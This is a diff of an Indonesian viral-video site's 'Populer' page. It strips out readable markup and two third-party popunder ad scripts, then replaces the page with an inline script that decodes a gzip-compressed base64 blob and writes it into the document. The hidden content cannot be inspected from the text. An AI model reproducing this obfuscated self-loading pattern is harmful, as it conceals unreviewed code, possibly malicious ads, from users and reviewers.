@@ -1,164 +1,23 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="id">
 <head>
-
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <title>Populer - AVFYP</title>
-
-    <link rel="icon" type="image/png" href="/admin/thumbnail/favicon/avfyp.png">
-    <link rel="stylesheet" href="/css/style.css?v=1000">
-    <link rel="stylesheet" href="/css/popup.css?v=1000">
-
-    <!-- POPUNDER ADS -->
-    <script src="https://ballroomfondnessnovelty.com/69/40/6d/69406da415e30232d2db6e0e35e17600.js"></script>
-    
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Populer - AVFYP</title>
 </head>
-
 <body>
-
-    <!-- HEADER -->
-    <header class="header">
-
-        <button class="menu-button" id="menuButton" aria-label="Buka menu">
-            <span></span>
-            <span></span>
-            <span></span>
-        </button>
-
-        <a href="/" class="logo">AVFYP</a>
-
-    </header>
-
-
-    <!-- SIDEBAR -->
-    <aside class="sidebar" id="sidebar">
-
-        <div class="sidebar-header">
-            <span>MENU</span>
-
-            <button id="closeMenu" class="close-menu" aria-label="Tutup menu">
-                ×
-            </button>
-        </div>
-
-        <nav class="sidebar-menu">
-
-            <a href="/">🏠 Beranda</a>
-            <a href="/populer/" class="active">🔥 Populer</a>
-            <a href="#">🆕 Terbaru</a>
-            <a href="https://t.me/kolrktorhandal">
-                ✈️ Telegram
-            </a>
-
-        </nav>
-
-    </aside>
-
-
-    <!-- OVERLAY -->
-    <div class="overlay" id="overlay"></div>
-
-
-    <!-- MAIN -->
-    <main class="container popular-page">
-
-        <h1>🔥 Populer</h1>
-
-        <!-- SEARCH -->
-        <div class="search-box">
-
-            <input
-                type="search"
-                id="searchInput"
-                placeholder="Mau nyari apaan bang?:v"
-                autocomplete="off"
-            >
-
-            <button id="searchButton" aria-label="Cari">🔍</button>
-
-        </div>
-
-
-        <!-- POPULAR VIDEOS -->
-        <section>
-
-            <div class="section-title">
-                <h2>Video Terpopuler</h2>
-                <span id="pageInfo">Halaman 1</span>
-            </div>
-
-            <div class="video-grid" id="videoGrid"></div>
-
-
-            <!-- PAGINATION -->
-            <div class="pagination">
-
-                <button id="prevButton" disabled>
-                    ← Sebelumnya
-                </button>
-
-                <span id="pageNumber">1</span>
-
-                <button id="nextButton">
-                    Selanjutnya →
-                </button>
-
-            </div>
-
-        </section>
-
-
-        <!-- ABOUT -->
-        <section class="about">
-
-            <p>
-                Pusat nonton video viral fyp. Update setiap hari dan pastinya 100% gratis.
-                Hanya di AVFYP Asupan FYP Untuk Penyegar Harimu :)
-            </p>
-
-        </section>
-
-
-        <!-- COPYRIGHT -->
-        <footer class="footer">
-
-            <p class="copyright">
-                © 2026 AVFYP. All Rights Reserved.
-            </p>
-
-            <p class="copyright-note">
-                All content belongs to their respective owners.
-            </p>
-
-        </footer>
-
-    </main>
-
-
-    <!-- TELEGRAM -->
-    <a
-        href="https://t.me/kolektorhandal"
-        target="_blank"
-        rel="noopener noreferrer"
-        class="telegram-popup"
-        aria-label="Telegram AVFYP"
-    >
-
-        <span class="telegram-icon">✈️</span>
-
-        <div class="telegram-text">
-            <strong>Telegram</strong>
-            <!--<small>Dapatkan update terbaru</small>-->
-        </div>
-
-    </a>
-
-    <script src="/js/script.js?v=1000"></script>
-
-    <!-- SOCIALBAR ADS -->
-    <script src="https://ballroomfondnessnovelty.com/3a/57/4b/3a574b0d69a264fb3313e5cc66b8c640.js"></script>
-    
+<script>
+(async()=>{try{
+const b64="H4sIAE8PqmoC/6VXzW7jNhC+71NwVfRQoLJsx/H+wPbCSbyJgSQ2HCdATgUl0RY3FCmQlLN+gUUvxRZFi14KtJce+gY9t2/SF2gfoUP9y9IuFlgfEpGcGc5888vR07PF6fp+OUOBDtnkycj8Qwzz7diivmU2CPYnT54g+I1CojHyAiwV0WPrdv3afg4k5RHHIRlbO0oeIyG1hTzBNeFA+kh9HYx9sqMesZPF14hyqilmtvIwI+Nep2vl12iqGZksRRQzIpGNpnev75cjJ93OaBjlD0gSBmrCLRbS+wiupiHeEifiWwsFkmzGloP9kHJHB3HockyZs8E7w+Dg3WYfdQzl5FCg0ntGVECILqR4SjnJdge+Xu3GvW63+8mMERgS1RlTzqe2jZaL5e312WyFpmc3yLYzmcqTNNJISW9sBVpH6qXjuJgxKUS4EdznRCkudoTpfccToTN84Qy6ztCHj0F36ONB75gcdftHfb/vu0PSJUfHpPds2O123ihrMnJS+aDHyMn8O3KFv68qdjGbGrUKlQwdeMNjWClQKlnlliQEbqy14DlBSHhsp1sWon66cZKtsaTYZtg1oJ3EDxiZwwzPQp6KMDeqmn+fdTJyUj2qyuLcQVauMBNbYU2yUMM5Ek5qKCxLZG7mZ7OTaQUarKhPcjnm28UyNTpfVK/26e6A1i7QbBpzNbu+zQ2qH2d4m2s8JhS5MhjmkpMdO4G1hvY61nHUBrf5/f1z/YYCt3IHlK/awnHDlkx2XVIJ9+S/X9//hk6IxNzHCdDthFGa/aV/sKfpjhj+H39HWW34MP8XhvDdT2hNJCgVf5gwzy7dCYnzIJh80EIGRjnWgtA/v3z775/vQSojW4nDA7hwFRoHsCmiKImQWhAt7mary+l9GUSVsIDElgzv0xDKF5Mc/FLG1XR+XQoIMS2yzxReWEK+JjiCWyIojLUwDHoHUMJG5TgJ9Nl0dXpR3NCIXoKlF9iueNvwN+VRrBvopTU6ZbMap0m+JGdzw90kiBj2SCAYpMrYusIx4nsIbYQjjDlyoWW9erlrcuFYCyiRESMaLhebTZ3kI1mVKtNWs05hkUTid221peqnWp2/hKJxB8VjcVPHVBGIbdFI8BrUCYWdtMCWuBwF/ckdhJgwAR8VHu23UJpSkphnImLON1D0LjDDIez2WmvqQc4fqrYz19pbCdNCIjZZn5vlpIFEicb0fH49Xc8X1zUkDmWDipRjY/lhhB36KpJkl3vKpwq7jPhN45MUfvc9uiHgxjiE+GkKbTq0HbprmChMze61VudD/Th5qzP92tW6ITB0vYk16AQq/vCpejUqslMGUz0ApyeL23Vr3BUV1hWQdocXRE19l7HCGnGoMcCc+Bv+SsyQGanQbeRjTRCMiBRHKDAp6gNuEVaaGutgBPoSQfXUVHUaoi+wIfFpOvOhqYoN5ubzluv4AS0J35MtlkAoaRijl18dwBF9Ehini+X9an5+cQDIRghdzjjpqglIWWSjvaTbQLe49K8/UL/bH6ZmdNCUMbQypAqtiCJyR/zORxT/wD02B4VaLjPSs1EbQWALvlVIC6QDQiVMpioiSe9E4hE6gup8FLHU6KJxmaZS6znr2eXsfDW9qkw/BXd7RyWVjlqQaiy35g3xjQth/1DuJ3M0FyIipnlxARKJlOCFgiIDRWct2E6m6/K4NuxkNKkXUpqqsUk+H8pLnhOTtNE3UrtanAoODbndmN20BDdMcg1AULrRKIUjFcJcPzmDLqYfQJ04zR6dzy3pcS1KKylfmVSrTwbnjcpGfJj3i1dHZewvW/zidD69NNPsZ70/jrBz/MwZuPBx/Gzgdv3hC9wfDjbu0VHviBx73nDoPveGg5b3R/rugGZl3p//A8rGt0WPDgAA";
+const bin=atob(b64);
+const bytes=Uint8Array.from(bin,c=>c.charCodeAt(0));
+const ds=new DecompressionStream("gzip");
+const html=await new Response(new Blob([bytes]).stream().pipeThrough(ds)).text();
+document.open();document.write(html);document.close();
+}catch(e){
+console.error(e);
+document.body.innerHTML="<h2>Gagal memuat halaman.</h2>";
+}})();
+</script>
 </body>
 </html>
